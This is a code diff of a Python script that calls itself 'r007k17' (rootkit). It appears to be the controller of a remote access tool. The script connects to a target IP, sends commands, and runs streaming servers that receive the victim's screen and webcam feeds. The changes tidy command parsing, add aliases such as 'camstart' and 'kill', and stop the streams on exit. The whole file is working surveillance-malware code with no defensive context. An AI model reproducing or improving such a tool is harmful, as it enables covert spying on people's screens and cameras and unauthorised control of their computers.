@@ -1,18 +1,27 @@
 import socket
-import os
+import os, re
 from vidstream import StreamingServer
 import threading
 
+def stopSpaceError(data):
+    data = " ".join(re.split(r"\s+", (re.sub(r"^\s+|\s+$", "", data))))
+    return data
 
 print("###################################")
 print("##### r007k17 by 7r1574n n13l #####")
 print("###################################")
 
 def command(commandToExecute):
+    commandToExecute = stopSpaceError(commandToExecute)
+    commandToExecuteList = commandToExecute.split()
     global ipToConnect
-    if commandToExecute[0:8] in ("connect ", "connexion ", "connecter ", "co "):
-        ipToConnect = commandToExecute[8:len(commandToExecute)]
-        return ipToConnect
+    if commandToExecuteList[0] in ("connect", "connexion", "connecter", "co"):
+        if len(commandToExecuteList) > 1 and ("".join(commandToExecuteList[1].split("."))).isdigit() == True:
+            ipToConnect = commandToExecuteList[1]
+            return ipToConnect
+        else:
+            print("[ERROR]: no ip requested")
+            command(input(">"))
     elif commandToExecute in ("getIp", "Ipget", "getip", "ipget"):
         getIp()
     elif commandToExecute in ("listIp", "Iplist", "iplist", "listip"):
@@ -27,21 +36,21 @@ def command(commandToExecute):
 
 def sendData(data):
         global run
-        if data == "die":
+        if data in ("die", "kill"):
             client.send(data.encode())
             run = False
-        elif data == "left":
+        elif data in ("left", "quit"):
             camera.stop_server()
             screen.stop_server()
             client.send(data.encode())
             run = False
-        elif data == "screenStart":
+        elif data in ("screenStart", "screenstart", "screenRun", "sreenrun", "Startscreen", "startscreen", "Runscreen", "runscreen"):
             client.send("screen".encode())
-        elif data == "screenStop":
+        elif data in ("screenStop", "screenstop", "Stopscreen", "stopscreen"):
             screenStop()
-        elif data == "cameraStart":
+        elif data in ("cameraStart", "camerastart", "cameraRun", "camerarun", "camStart", "camstart", "camRun", "camrun", "Startcamera", "startcamera", "Runcamera", "runcamera", "Startcam", "startcam", "Runcam", "runcam"):
             client.send("camera".encode())
-        elif data == "cameraStop":
+        elif data in ("cameraStop", "camerastop", "camStop", "camstop", "Stopcamera", "stopcamera", "Stopcam", "stopcam"):
             cameraStop()
         else:
             client.send(data.encode())
@@ -102,8 +111,10 @@ while progrun == True:
             client.connect((ip, port))
         except:
             run = False
-            print("can't connect to "+ip)
-    
+            try:
+                print("can't connect to "+ip)
+            except:
+                print("ip isn't allowed")
         screen = StreamingServer(ipHost, 22224)
         t = threading.Thread(target=screen.start_server)
         t.start()
@@ -114,5 +125,7 @@ while progrun == True:
     while run == True and progrun == True:
         dataToSend = input("%s>" % (ip))
         sendData(dataToSend)
+    camera.stop_server()
+    screen.stop_server()
 print("prog stop")
 exit()
